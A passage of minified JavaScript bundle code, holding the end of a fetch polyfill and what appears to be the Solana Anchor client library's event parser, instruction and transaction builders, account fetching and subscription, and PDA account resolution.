              this.map.hasOwnProperty(n) && t.call(e, this.map[n], n, this);
          }),
          (f.prototype.keys = function () {
            var t = [];
            return (
              this.forEach(function (e, n) {
                t.push(n);
              }),
              d(t)
            );
          }),
          (f.prototype.values = function () {
            var t = [];
            return (
              this.forEach(function (e) {
                t.push(e);
              }),
              d(t)
            );
          }),
          (f.prototype.entries = function () {
            var t = [];
            return (
              this.forEach(function (e, n) {
                t.push([n, e]);
              }),
              d(t)
            );
          }),
          r && (f.prototype[Symbol.iterator] = f.prototype.entries);
        var w = ["DELETE", "GET", "HEAD", "OPTIONS", "POST", "PUT"];
        function b(t, e) {
          var n,
            r,
            o = (e = e || {}).body;
          if (t instanceof b) {
            if (t.bodyUsed) throw new TypeError("Already read");
            (this.url = t.url),
              (this.credentials = t.credentials),
              e.headers || (this.headers = new f(t.headers)),
              (this.method = t.method),
              (this.mode = t.mode),
              (this.signal = t.signal),
              o ||
                null == t._bodyInit ||
                ((o = t._bodyInit), (t.bodyUsed = !0));
          } else this.url = String(t);
          if (
            ((this.credentials =
              e.credentials || this.credentials || "same-origin"),
            (!e.headers && this.headers) || (this.headers = new f(e.headers)),
            (this.method =
              ((n = e.method || this.method || "GET"),
              (r = n.toUpperCase()),
              w.indexOf(r) > -1 ? r : n)),
            (this.mode = e.mode || this.mode || null),
            (this.signal = e.signal || this.signal),
            (this.referrer = null),
            ("GET" === this.method || "HEAD" === this.method) && o)
          )
            throw new TypeError("Body not allowed for GET or HEAD requests");
          this._initBody(o);
        }
        function v(t) {
          var e = new FormData();
          return (
            t
              .trim()
              .split("&")
              .forEach(function (t) {
                if (t) {
                  var n = t.split("="),
                    r = n.shift().replace(/\+/g, " "),
                    o = n.join("=").replace(/\+/g, " ");
                  e.append(decodeURIComponent(r), decodeURIComponent(o));
                }
              }),
            e
          );
        }
        function A(t, e) {
          e || (e = {}),
            (this.type = "default"),
            (this.status = void 0 === e.status ? 200 : e.status),
            (this.ok = this.status >= 200 && this.status < 300),
            (this.statusText = "statusText" in e ? e.statusText : "OK"),
            (this.headers = new f(e.headers)),
            (this.url = e.url || ""),
            this._initBody(t);
        }
        (b.prototype.clone = function () {
          return new b(this, { body: this._bodyInit });
        }),
          y.call(b.prototype),
          y.call(A.prototype),
          (A.prototype.clone = function () {
            return new A(this._bodyInit, {
              status: this.status,
              statusText: this.statusText,
              headers: new f(this.headers),
              url: this.url,
            });
          }),
          (A.error = function () {
            var t = new A(null, { status: 0, statusText: "" });
            return (t.type = "error"), t;
          });
        var k = [301, 302, 303, 307, 308];
        (A.redirect = function (t, e) {
          if (-1 === k.indexOf(e)) throw new RangeError("Invalid status code");
          return new A(null, { status: e, headers: { location: t } });
        }),
          (t.DOMException = n.DOMException);
        try {
          new t.DOMException();
        } catch (S) {
          (t.DOMException = function (t, e) {
            (this.message = t), (this.name = e);
            var n = Error(t);
            this.stack = n.stack;
          }),
            (t.DOMException.prototype = Object.create(Error.prototype)),
            (t.DOMException.prototype.constructor = t.DOMException);
        }
        function I(e, n) {
          return new Promise(function (r, i) {
            var s = new b(e, n);
            if (s.signal && s.signal.aborted)
              return i(new t.DOMException("Aborted", "AbortError"));
            var a = new XMLHttpRequest();
            function u() {
              a.abort();
            }
            (a.onload = function () {
              var t,
                e,
                n = {
                  status: a.status,
                  statusText: a.statusText,
                  headers:
                    ((t = a.getAllResponseHeaders() || ""),
                    (e = new f()),
                    t
                      .replace(/\r?\n[\t ]+/g, " ")
                      .split(/\r?\n/)
                      .forEach(function (t) {
                        var n = t.split(":"),
                          r = n.shift().trim();
                        if (r) {
                          var o = n.join(":").trim();
                          e.append(r, o);
                        }
                      }),
                    e),
                };
              n.url =
                "responseURL" in a
                  ? a.responseURL
                  : n.headers.get("X-Request-URL");
              var o = "response" in a ? a.response : a.responseText;
              r(new A(o, n));
            }),
              (a.onerror = function () {
                i(new TypeError("Network request failed"));
              }),
              (a.ontimeout = function () {
                i(new TypeError("Network request failed"));
              }),
              (a.onabort = function () {
                i(new t.DOMException("Aborted", "AbortError"));
              }),
              a.open(s.method, s.url, !0),
              "include" === s.credentials
                ? (a.withCredentials = !0)
                : "omit" === s.credentials && (a.withCredentials = !1),
              "responseType" in a && o && (a.responseType = "blob"),
              s.headers.forEach(function (t, e) {
                a.setRequestHeader(e, t);
              }),
              s.signal &&
                (s.signal.addEventListener("abort", u),
                (a.onreadystatechange = function () {
                  4 === a.readyState &&
                    s.signal.removeEventListener("abort", u);
                })),
              a.send(void 0 === s._bodyInit ? null : s._bodyInit);
          });
        }
        return (
          (I.polyfill = !0),
          n.fetch ||
            ((n.fetch = I), (n.Headers = f), (n.Request = b), (n.Response = A)),
          (t.Headers = f),
          (t.Request = b),
          (t.Response = A),
          (t.fetch = I),
          Object.defineProperty(t, "__esModule", { value: !0 }),
          t
        );
      })({}),
      (o.fetch.ponyfill = !0),
      delete o.fetch.polyfill;
    var i = o;
    ((e = i.fetch).default = i.fetch),
      (e.fetch = i.fetch),
      (e.Headers = i.Headers),
      (e.Request = i.Request),
      (e.Response = i.Response),
      (t.exports = e);
  })(gm, gm.exports),
    Fl.rustEnum(
      [
        Fl.struct([], "uninitialized"),
        Fl.struct([Fl.option(Fl.publicKey(), "authorityAddress")], "buffer"),
        Fl.struct([Fl.publicKey("programdataAddress")], "program"),
        Fl.struct(
          [
            Fl.u64("slot"),
            Fl.option(Fl.publicKey(), "upgradeAuthorityAddress"),
          ],
          "programData"
        ),
      ],
      void 0,
      Fl.u32()
    );
  const ym = "Program log: ",
    wm = "Program data: ";
  class bm {
    constructor(t, e, n) {
      (this._programId = t),
        (this._provider = e),
        (this._eventParser = new vm(t, n)),
        (this._eventCallbacks = new Map()),
        (this._eventListeners = new Map()),
        (this._listenerIdCount = 0);
    }
    addEventListener(t, e, n) {
      var r;
      let o = this._listenerIdCount;
      return (
        (this._listenerIdCount += 1),
        this._eventListeners.has(t) || this._eventListeners.set(t, []),
        this._eventListeners.set(
          t,
          (null !== (r = this._eventListeners.get(t)) && void 0 !== r
            ? r
            : []
          ).concat(o)
        ),
        this._eventCallbacks.set(o, [t, e]),
        void 0 !== this._onLogsSubscriptionId ||
          (this._onLogsSubscriptionId = this._provider.connection.onLogs(
            this._programId,
            (t, e) => {
              if (!t.err)
                for (const n of this._eventParser.parseLogs(t.logs)) {
                  const r = this._eventListeners.get(n.name);
                  r &&
                    r.forEach((r) => {
                      const o = this._eventCallbacks.get(r);
                      if (o) {
                        const [, r] = o;
                        r(n.data, e.slot, t.signature);
                      }
                    });
                }
            },
            n
          )),
        o
      );
    }
    async removeEventListener(t) {
      const e = this._eventCallbacks.get(t);
      if (!e) throw new Error(`Event listener ${t} doesn't exist!`);
      const [n] = e;
      let r = this._eventListeners.get(n);
      if (!r) throw new Error(`Event listeners don't exist for ${n}!`);
      if (
        (this._eventCallbacks.delete(t),
        (r = r.filter((e) => e !== t)),
        this._eventListeners.set(n, r),
        0 === r.length && this._eventListeners.delete(n),
        0 === this._eventCallbacks.size)
      ) {
        if (0 !== this._eventListeners.size)
          throw new Error(
            `Expected event listeners size to be 0 but got ${this._eventListeners.size}`
          );
        void 0 !== this._onLogsSubscriptionId &&
          (await this._provider.connection.removeOnLogsListener(
            this._onLogsSubscriptionId
          ),
          (this._onLogsSubscriptionId = void 0));
      }
    }
  }
  class vm {
    constructor(t, e) {
      (this.coder = e), (this.programId = t);
    }
    *parseLogs(t, e = !1) {
      const n = new km(t),
        r = new Am();
      let o = n.next();
      for (; null !== o; ) {
        let [t, i, s] = this.handleLog(r, o, e);
        t && (yield t), i && r.push(i), s && r.pop(), (o = n.next());
      }
    }
    handleLog(t, e, n) {
      return t.stack.length > 0 && t.program() === this.programId.toString()
        ? this.handleProgramLog(e, n)
        : [null, ...this.handleSystemLog(e)];
    }
    handleProgramLog(t, e) {
      if (t.startsWith(ym) || t.startsWith(wm)) {
        const n = t.startsWith(ym) ? t.slice(13) : t.slice(14),
          r = this.coder.events.decode(n);
        if (e && null === r) throw new Error(`Unable to decode event ${n}`);
        return [r, null, !1];
      }
      return [null, ...this.handleSystemLog(t)];
    }
    handleSystemLog(t) {
      const e = t.split(":")[0];
      return null !== e.match(/^Program (.*) success/g)
        ? [null, !0]
        : e.startsWith(`Program ${this.programId.toString()} invoke`)
        ? [this.programId.toString(), !1]
        : e.includes("invoke")
        ? ["cpi", !1]
        : [null, !1];
    }
  }
  class Am {
    constructor() {
      this.stack = [];
    }
    program() {
      if (!this.stack.length)
        throw new Error("Expected the stack to have elements");
      return this.stack[this.stack.length - 1];
    }
    push(t) {
      this.stack.push(t);
    }
    pop() {
      if (!this.stack.length)
        throw new Error("Expected the stack to have elements");
      this.stack.pop();
    }
  }
  class km {
    constructor(t) {
      this.logs = t;
    }
    next() {
      if (0 === this.logs.length) return null;
      let t = this.logs[0];
      return (this.logs = this.logs.slice(1)), t;
    }
  }
  function Im(t, e) {
    var n, r;
    let o = {};
    const i = t.args ? t.args.length : 0;
    if (e.length > i) {
      if (e.length !== i + 1)
        throw new Error(
          `provided too many arguments ${e} to instruction ${
            null == t ? void 0 : t.name
          } expecting: ${
            null !==
              (r =
                null === (n = t.args) || void 0 === n
                  ? void 0
                  : n.map((t) => t.name)) && void 0 !== r
              ? r
              : []
          }`
        );
      o = e.pop();
    }
    return [e, o];
  }
  class Sm {
    static build(t, e, n) {
      if ("_inner" === t.name) throw new Tp("the _inner name is reserved");
      const r = (...o) => {
        const [i, s] = Im(t, [...o]);
        bf(t.accounts, s.accounts), (function () {})(t, ...o);
        const a = r.accounts(s.accounts);
        return (
          void 0 !== s.remainingAccounts && a.push(...s.remainingAccounts),
          _p("debug-logs"),
          new vs({ keys: a, programId: n, data: e(t.name, wf(t, ...i)) })
        );
      };
      return (
        (r.accounts = (e) => Sm.accountsArray(e, t.accounts, n, t.name)), r
      );
    }
    static accountsArray(t, e, n, r) {
      return t
        ? e
            .map((e) => {
              if (mf(e)) {
                const o = t[e.name];
                return Sm.accountsArray(o, e.accounts, n, r).flat();
              }
              let o;
              try {
                o = vf(t[e.name]);
              } catch (s) {
                throw new Error(
                  `Wrong input type for account "${
                    e.name
                  }" in the instruction accounts object${
                    void 0 !== r ? ' for instruction "' + r + '"' : ""
                  }. Expected PublicKey or string.`
                );
              }
              const i = e.optional && o.equals(n);
              return {
                pubkey: o,
                isWritable: Boolean(e.writable && !i),
                isSigner: Boolean(e.signer && !i),
              };
            })
            .flat()
        : [];
    }
  }
  class _m {
    static build(t, e) {
      return (...n) => {
        var r, o, i;
        const [, s] = Im(t, [...n]),
          a = new As();
        if (s.preInstructions && s.instructions)
          throw new Error("instructions is deprecated, use preInstructions");
        return (
          null === (r = s.preInstructions) || void 0 === r
            ? void 0
            : r.forEach((t) => a.add(t)),
          null === (o = s.instructions) ||
            void 0 === o ||
            o.forEach((t) => a.add(t)),
          a.add(e(...n)),
          null === (i = s.postInstructions) ||
            void 0 === i ||
            i.forEach((t) => a.add(t)),
          a
        );
      };
    }
  }
  class Tm {
    static build(t, e, n, r) {
      return async (...o) => {
        var i;
        const s = e(...o),
          [, a] = Im(t, [...o]);
        if (void 0 === r.sendAndConfirm)
          throw new Error(
            "This function requires 'Provider.sendAndConfirm' to be implemented."
          );
        try {
          return await r.sendAndConfirm(
            s,
            null !== (i = a.signers) && void 0 !== i ? i : [],
            a.options
          );
        } catch (u) {
          throw xp(u, n);
        }
      };
    }
  }
  class Bm {
    static build(t, e, n, r) {
      var o;
      return (null !== (o = t.accounts) && void 0 !== o ? o : []).reduce(
        (o, i) => ((o[i.name] = new Cm(t, i, n, r, e)), o),
        {}
      );
    }
  }
  class Cm {
    get size() {
      return this._size;
    }
    get programId() {
      return this._programId;
    }
    get provider() {
      return this._provider;
    }
    get coder() {
      return this._coder;
    }
    constructor(t, e, n, r, o) {
      (this._idlAccount = e),
        (this._programId = n),
        (this._provider = null != r ? r : Qf()),
        (this._coder = null != o ? o : new qp(t)),
        (this._size = this._coder.accounts.size(e.name));
    }
    async fetchNullable(t, e) {
      const { data: n } = await this.fetchNullableAndContext(t, e);
      return n;
    }
    async fetchNullableAndContext(t, e) {
      const n = await this.getAccountInfoAndContext(t, e),
        { value: r, context: o } = n;
      return {
        data:
          r && 0 !== r.data.length
            ? this._coder.accounts.decode(this._idlAccount.name, r.data)
            : null,
        context: o,
      };
    }
    async fetch(t, e) {
      const { data: n } = await this.fetchNullableAndContext(t, e);
      if (null === n)
        throw new Error(
          `Account does not exist or has no data ${t.toString()}`
        );
      return n;
    }
    async fetchAndContext(t, e) {
      const { data: n, context: r } = await this.fetchNullableAndContext(t, e);
      if (null === n) throw new Error(`Account does not exist ${t.toString()}`);
      return { data: n, context: r };
    }
    async fetchMultiple(t, e) {
      return (await this.fetchMultipleAndContext(t, e)).map((t) =>
        t ? t.data : null
      );
    }
    async fetchMultipleAndContext(t, e) {
      return (
        await Kf(
          this._provider.connection,
          t.map((t) => vf(t)),
          e
        )
      ).map((t) => {
        if (null == t) return null;
        const { account: e, context: n } = t;
        return {
          data: this._coder.accounts.decode(this._idlAccount.name, e.data),
          context: n,
        };
      });
    }
    async all(t) {
      const e = this.coder.accounts.memcmp(
          this._idlAccount.name,
          t instanceof dt ? t : void 0
        ),
        n = [];
      return (
        null != (null == e ? void 0 : e.offset) &&
          null != (null == e ? void 0 : e.bytes) &&
          n.push({ memcmp: { offset: e.offset, bytes: e.bytes } }),
        null != (null == e ? void 0 : e.dataSize) &&
          n.push({ dataSize: e.dataSize }),
        (
          await this._provider.connection.getProgramAccounts(this._programId, {
            commitment: this._provider.connection.commitment,
            filters: [...n, ...(Array.isArray(t) ? t : [])],
          })
        ).map(({ pubkey: t, account: e }) => ({
          publicKey: t,
          account: this._coder.accounts.decode(this._idlAccount.name, e.data),
        }))
      );
    }
    subscribe(t, e) {
      const n = Em.get(t.toString());
      if (n) return n.ee;
      const r = new df();
      t = vf(t);
      const o = this._provider.connection.onAccountChange(
        t,
        (t) => {
          const e = this._coder.accounts.decode(this._idlAccount.name, t.data);
          r.emit("change", e);
        },
        e
      );
      return Em.set(t.toString(), { ee: r, listener: o }), r;
    }
    async unsubscribe(t) {
      let e = Em.get(t.toString());
      if (!e) return void 0, void 0;
      Em &&
        (await this._provider.connection
          .removeAccountChangeListener(e.listener)
          .then(() => {
            Em.delete(t.toString());
          })
          .catch(console.error));
    }
    async createInstruction(t, e) {
      const n = this.size;
      if (void 0 === this._provider.publicKey)
        throw new Error(
          "This function requires the Provider interface implementor to have a 'publicKey' field."
        );
      return Gs.createAccount({
        fromPubkey: this._provider.publicKey,
        newAccountPubkey: t.publicKey,
        space: null != e ? e : n,
        lamports:
          await this._provider.connection.getMinimumBalanceForRentExemption(
            null != e ? e : n
          ),
        programId: this._programId,
      });
    }
    async getAccountInfo(t, e) {
      return await this._provider.connection.getAccountInfo(vf(t), e);
    }
    async getAccountInfoAndContext(t, e) {
      return await this._provider.connection.getAccountInfoAndContext(vf(t), e);
    }
  }
  const Em = new Map();
  class xm {
    static build(t, e, n, r, o, i, s) {
      return async (...a) => {
        var u;
        const c = e(...a),
          [, l] = Im(t, [...a]);
        let d;
        if (void 0 === r.simulate)
          throw new Error(
            "This function requires 'Provider.simulate' to be implemented."
          );
        try {
          d = await r.simulate(
            c,
            l.signers,
            null === (u = l.options) || void 0 === u ? void 0 : u.commitment
          );
        } catch (p) {
          throw xp(p, n);
        }
        if (void 0 === d) throw new Error("Unable to simulate transaction");
        const f = d.logs;
        if (!f) throw new Error("Simulated logs not found");
        const h = [];
        if (s.events) {
          let t = new vm(i, o);
          for (const e of t.parseLogs(f)) h.push(e);
        }
        return { events: h, raw: f };
      };
    }
  }
  function Pm(t) {
    return new Mm(
      um(8),
      (t) => Nm.fromBuffer(t),
      (t) => t.toBuffer(),
      t
    );
  }
  function Om(t) {
    return new Mm(
      um(32),
      (t) => new Ji(t),
      (t) => t.toBuffer(),
      t
    );
  }
  function Rm(t, e) {
    return new Lm(t, e);
  }
  class Mm extends Kp {
    constructor(t, e, n, r) {
      super(t.span, r),
        (this.layout = t),
        (this.decoder = e),
        (this.encoder = n);
    }
    decode(t, e) {
      return this.decoder(this.layout.decode(t, e));
    }
    encode(t, e, n) {
      return this.layout.encode(this.encoder(t), e, n);
    }
    getSpan(t, e) {
      return this.layout.getSpan(t, e);
    }
  }
  class Lm extends Kp {
    constructor(t, e) {
      super(-1, e), (this.layout = t), (this.discriminator = om());
    }
    encode(t, e, n = 0) {
      return null == t
        ? this.layout.span + this.discriminator.encode(0, e, n)
        : (this.discriminator.encode(1, e, n),
          this.layout.encode(t, e, n + 4) + 4);
    }
    decode(t, e = 0) {
      const n = this.discriminator.decode(t, e);
      if (0 === n) return null;
      if (1 === n) return this.layout.decode(t, e + 4);
      throw new Error("Invalid coption " + this.layout.property);
    }
    getSpan(t, e = 0) {
      return this.layout.getSpan(t, e + 4) + 4;
    }
  }
  class Nm extends Yn {
    toBuffer() {
      const t = super.toArray().reverse(),
        e = dt.from(t);
      if (8 === e.length) return e;
      if (e.length >= 8) throw new Error("u64 too large");
      const n = dt.alloc(8);
      return e.copy(n), n;
    }
    static fromBuffer(t) {
      if (8 !== t.length) throw new Error(`Invalid buffer length: ${t.length}`);
      return new Nm(
        [...t]
          .reverse()
          .map((t) => `00${t.toString(16)}`.slice(-2))
          .join(""),
        16
      );
    }
  }
  const Dm = sm([
    Om("mint"),
    Om("owner"),
    Pm("amount"),
    Rm(Om(), "delegate"),
    (() => {
      const t = am(((t) => new jp(1, t))("discriminator"), null, "state");
      return (
        t.addVariant(0, sm([]), "uninitialized"),
        t.addVariant(1, sm([]), "initialized"),
        t.addVariant(2, sm([]), "frozen"),
        t
      );
    })(),
    Rm(Pm(), "isNative"),
    Pm("delegatedAmount"),
    Rm(Om(), "closeAuthority"),
  ]);
  class Um {
    constructor(t, e, n, r, o, i, s, a) {
      (this._args = t),
        (this._accounts = e),
        (this._provider = n),
        (this._programId = r),
        (this._idlIx = o),
        (this._idlTypes = s),
        (this._customResolver = a),
        (this._accountStore = new qm(n, i, r));
    }
    args(t) {
      this._args = t;
    }
    async resolve() {
      this.resolveEventCpi(this._idlIx.accounts),
        this.resolveConst(this._idlIx.accounts);
      let t = 0;
      for (
        ;
        (await this.resolvePdasAndRelations(this._idlIx.accounts)) +
          (await this.resolveCustom()) >
        0;

      )
        if ((t++, 16 === t)) {
          const t = (e) =>
              mf(e)
                ? e.accounts.some(t)
                : !!(e.address || e.pda || e.relations),
            e = (t, n = [], r = []) => {
              for (const o of t)
                mf(o)
                  ? r.push(...e(o.accounts, [...n, o.name]))
                  : r.push([...n, o.name]);
              return r;
            },
            n = this._idlIx.accounts.filter(t),
            r = e(n)
              .filter((t) => !this.get(t))
              .map((t) => t.reduce((t, e) => t + "." + e))
              .map((t) => `\`${t}\``)
              .join(", ");
          throw new Error(
            [
              "Reached maximum depth for account resolution.",
              `Unresolved accounts: ${r}`,
            ].join(" ")
          );
        }
    }
    resolveOptionals(t) {
      Object.assign(
        this._accounts,
        this.resolveOptionalsHelper(t, this._idlIx.accounts)
      );
    }
    get(t) {
      const e = t.reduce((t, e) => t && t[e], this._accounts);
      if (e && e.toBase58) return e;
    }
    set(t, e) {
      let n = this._accounts;
      t.forEach((r, o) => {
        var i;
        o === t.length - 1 && (n[r] = e),
          (n[r] = null !== (i = n[r]) && void 0 !== i ? i : {}),
          (n = n[r]);
      });
    }
    resolveOptionalsHelper(t, e) {
      const n = {};
      for (const r of e) {
        const e = r.name,
          o = t[e];
        void 0 !== o &&
          (Km(o)
            ? mf(r)
              ? (n[e] = this.resolveOptionalsHelper(o, r.accounts))
              : (n[e] = Wm(o))
            : null !== o
            ? (n[e] = vf(o))
            : r.optional && (n[e] = this._programId));
      }
      return n;
    }
    async resolveCustom() {
      if (this._customResolver) {
        const { accounts: t, resolved: e } = await this._customResolver({
          args: this._args,
          accounts: this._accounts,
          provider: this._provider,
          programId: this._programId,
          idlIx: this._idlIx,
        });
        return (this._accounts = t), e;
      }
      return 0;
    }
    resolveEventCpi(t, e = []) {
      for (const n in t) {
        const r = t[n];
        mf(r) && this.resolveEventCpi(r.accounts, [...e, r.name]);
        const o = +n + 1;
        if (o === t.length) return;
        const i = t[n].name,
          s = t[o].name;
        if ("eventAuthority" === i && "program" === s) {
          const t = [...e, i],
            n = [...e, s];
          return (
            this.get(t) ||
              this.set(
                t,
                Ji.findProgramAddressSync(
                  [dt.from("__event_authority")],
                  this._programId
                )[0]
              ),
            this.get(n) || this.set(n, this._programId),
            void 0
          );
        }
      }
    }
    resolveConst(t, e = []) {
      for (const n of t) {
        const t = n.name;
        if (mf(n)) this.resolveConst(n.accounts, [...e, t]);
        else {
          const r = n;
          if ((r.signer || r.address) && !this.get([...e, t])) {
            if (r.signer) {
              if (!this._provider.publicKey)
                throw new Error(
                  "This function requires the `Provider` interface implementor to have a `publicKey` field."
                );
              this.set([...e, t], this._provider.publicKey);
            }
            r.address && this.set([...e, t], vf(r.address));
          }
        }
      }
    }
    async resolvePdasAndRelations(t, e = []) {
      let n = 0;
      for (const r of t) {
        const t = r.name;
        if (mf(r))
          n += await this.resolvePdasAndRelations(r.accounts, [...e, t]);
        else {
          const o = r;
          if ((o.pda || o.relations) && !this.get([...e, t])) {
            n++;
            try {
              if (o.pda) {
                const n = await Promise.all(
                  o.pda.seeds.map((t) => this.toBuffer(t, e))
                );
                if (n.some((t) => !t)) continue;
                const r = await this.parseProgramId(o, e),
                  [i] = Ji.findProgramAddressSync(n, r);
                this.set([...e, t], i);
              }
            } catch {}
            try {
              if (o.relations) {
                const n = this.get([...e, o.relations[0]]);
                if (n) {
                  const r = await this._accountStore.fetchAccount({
                    publicKey: n,
                  });
                  this.set([...e, t], r[t]);
                }
              }
            } catch {}
          }
        }
      }
      return n;
    }
    async parseProgramId(t, e = []) {
      var n;
      if (!(null === (n = t.pda) || void 0 === n ? void 0 : n.program))
        return this._programId;
      const r = await this.toBuffer(t.pda.program, e);
      if (!r) throw new Error(`Program seed not resolved: ${t.name}`);
      return new Ji(r);
    }
    async toBuffer(t, e = []) {
      switch (t.kind) {
        case "const":
          return this.toBufferConst(t);
        case "arg":
          return await this.toBufferArg(t);
        case "account":
          return await this.toBufferAccount(t, e);
        default:
          throw new Error(`Unexpected seed: ${t}`);
      }
    }
    toBufferConst(t) {
      return this.toBufferValue("bytes", t.value);
    }
    async toBufferArg(t) {
      const [e, ...n] = t.path.split("."),
        r = this._idlIx.args.findIndex((t) => t.name === e);
      if (-1 === r) throw new Error(`Unable to find argument for seed: ${e}`);
      const o = n.reduce((t, e) => (null != t ? t : {})[e], this._args[r]);
      if (void 0 === o) return;
      const i = this.getType(this._idlIx.args[r].type, n);
      return this.toBufferValue(i, o);
    }
    async toBufferAccount(t, e = []) {
      const [n, ...r] = t.path.split("."),
        o = this.get([...e, n]);
      if (!o) return;
      if (!r.length) return this.toBufferValue("pubkey", o);
      if (!t.account)
        throw new Error(
          `Seed account is required in order to resolve type: ${t.path}`
        );
      let i = await this._accountStore.fetchAccount({
          publicKey: o,
          name: t.account,
        }),
        s = r;
      for (; s.length > 0; ) (i = i[s[0]]), (s = s.slice(1));
      if (void 0 === i) return;
      const a = this.getType({ defined: { name: t.account } }, r);
      return this.toBufferValue(a, i);
    }
    toBufferValue(t, e) {
      switch (t) {
        case "u8":
        case "i8":
          return dt.from([e]);
        case "u16":
        case "i16":
          return new Yn(e).toArrayLike(dt, "le", 2);
        case "u32":
        case "i32":
          return new Yn(e).toArrayLike(dt, "le", 4);
        case "u64":
        case "i64":
          return new Yn(e).toArrayLike(dt, "le", 8);
        case "u128":
        case "i128":
          return new Yn(e).toArrayLike(dt, "le", 16);
        case "u256":
        case "i256":
          return new Yn(e).toArrayLike(dt, "le", 32);
        case "string":
        case "bytes":
          return dt.from(e);
        case "pubkey":
          return e.toBuffer();
        default:
          if (null == t ? void 0 : t.array) return dt.from(e);
          throw new Error(`Unexpected seed type: ${t}`);
      }
    }
    getType(t, e = []) {
      var n;
      const r =
        null === (n = null == t ? void 0 : t.defined) || void 0 === n
          ? void 0
          : n.name;
      if (r) {
        if ("tokenAccount" === r)
          switch (e.at(0)) {
            case "mint":
            case "owner":
              return "pubkey";
            case "amount":
            case "delagatedAmount":
              return "u64";
            default:
              throw new Error(`Unknown token account path: ${e}`);
          }
        const t = this._idlTypes.find((t) => t.name === r);
        if (!t) throw new Error(`Type not found: ${r}`);
        const [n, ...o] = e,
          i = t.type.fields.find((t) => t.name === n);
        if (!i) throw new Error(`Field not found: ${n}`);
        return this.getType(i.type, o);
      }
      return t;
    }
  }
  class qm {
    constructor(t, e, n) {
      (this._provider = t),
        (this._cache = new Map()),
        (this._idls = {}),
        (this._idls[n.toBase58()] = e);
    }
    async fetchAccount({ publicKey: t, name: e }) {
      const n = t.toBase58();
      if (!this._cache.has(n)) {
        const o = await this._provider.connection.getAccountInfo(t);
        if (null === o) throw new Error(`Account not found: ${n}`);
        if ("tokenAccount" === e) {
          const t = ((r = o.data), Dm.decode(r));
          this._cache.set(n, t);
        } else {
          const t = await this.getAccountsNs(o.owner);
          if (t) {
            const e = Object.values(t)[0];
            if (e) {
              const t = e.coder.accounts.decodeAny(o.data);
              this._cache.set(n, t);
            }
          }
        }
      }
      var r;
      return this._cache.get(n);
    }
    async getAccountsNs(t) {
      const e = t.toBase58();
      if (!this._idls[e]) {
        const n = await Vm.fetchIdl(t, this._provider);
        if (n) {
          const t = new Vm(n, this._provider);
          this._idls[e] = t.account;
        }
      }
      return this._idls[e];
    }
  }
  class zm {
    static build(t, e, n, r, o, i, s, a, u, c, l) {
      return (...d) => new Fm(d, r, o, i, s, a, t, e, n, u, c, l);
    }
  }
  function Km(t) {
    return "object" == typeof t && null !== t && !("_bn" in t);
  }
  function Wm(t, e) {
    const n = {};
    for (const r in t) {
      const e = t[r];
      if (null === e)
        throw new Error(
          "Failed to resolve optionals due to IDL type mismatch with input accounts!"
        );
      n[r] = Km(e) ? Wm(e) : vf(e);
    }
    return n;
  }
  class Fm {
    constructor(t, e, n, r, o, i, s, a, u, c, l, d) {
      (this._args = t),
        (this._ixFn = e),
        (this._txFn = n),
        (this._rpcFn = r),
        (this._simulateFn = o),
        (this._viewFn = i),
        (this._accounts = {}),
        (this._remainingAccounts = []),
        (this._signers = []),
        (this._preInstructions = []),
        (this._postInstructions = []),
        (this._resolveAccounts = !0),
        (this._accountsResolver = new Um(t, this._accounts, s, a, u, c, l, d));
    }
    args(t) {
      (this._args = t), this._accountsResolver.args(t);
    }
    accounts(t) {
      return this.accountsPartial(t);
    }
    accountsPartial(t) {
      return (
        (this._resolveAccounts = !0),
        this._accountsResolver.resolveOptionals(t),
        this
      );
    }
    accountsStrict(t) {
      return (
        (this._resolveAccounts = !1),
        this._accountsResolver.resolveOptionals(t),
        this
      );
    }
    signers(t) {
      return (this._signers = this._signers.concat(t)), this;
    }
    remainingAccounts(t) {
      return (
        (this._remainingAccounts = this._remainingAccounts.concat(t)), this
      );
    }
    preInstructions(t, e = !1) {
      return (
        (this._preInstructions = e
          ? t.concat(this._preInstructions)
          : this._preInstructions.concat(t)),
        this
      );
    }
    postInstructions(t) {
      return (this._postInstructions = this._postInstructions.concat(t)), this;
    }
    async pubkeys() {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._accounts
      );
    }
    async instruction() {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._ixFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
        })
      );
    }
    async transaction() {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._txFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
        })
      );
    }
    async simulate(t) {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._simulateFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
          options: t,
        })
      );
    }
    async view(t) {
      if (
        (this._resolveAccounts && (await this._accountsResolver.resolve()),
        !this._viewFn)
      )
        throw new Error(
          [
            "Method does not support views.",
            "The instruction should return a value, and its accounts must be read-only",
          ].join(" ")
        );
      return this._viewFn(...this._args, {
        accounts: this._accounts,
        signers: this._signers,
        remainingAccounts: this._remainingAccounts,
        preInstructions: this._preInstructions,
        postInstructions: this._postInstructions,
        options: t,
      });
    }
    async rpc(t) {
      return (
        this._resolveAccounts && (await this._accountsResolver.resolve()),
        this._rpcFn(...this._args, {
          accounts: this._accounts,
          signers: this._signers,
          remainingAccounts: this._remainingAccounts,
          preInstructions: this._preInstructions,
          postInstructions: this._postInstructions,
          options: t,
        })
      );
    }
    async rpcAndKeys(t) {
      return { signature: await this.rpc(t), pubkeys: await this.pubkeys() };
    }
    async prepare() {
      return {
        instruction: await this.instruction(),
        signers: this._signers,
        pubkeys: await this.pubkeys(),
      };
    }
  }
  class jm {
    static build(t, e, n, r) {
      const o = e.accounts.find((t) => t.writable),
        i = !!e.returns;
      if (o || !i) return;
      return async (...o) => {
        let i = await n(...o);
        const s = `Program return: ${t} `;
        let a = i.raw.find((t) => t.startsWith(s));
        if (!a) throw new Error("View expected return log");
        let u = pf(a.slice(s.length)),
          c = e.returns;
        if (!c) throw new Error("View expected return type");
        return Rp.fieldLayout({ type: c }, r.types).decode(u);
      };
    }
  }
  class Gm {
    static build(t, e, n, r, o) {
      const i = {},
        s = {},
        a = {},
        u = {},
        c = {},
        l = {},
        d = (function (t) {
          const e = new Map();
          return (
            t.errors &&
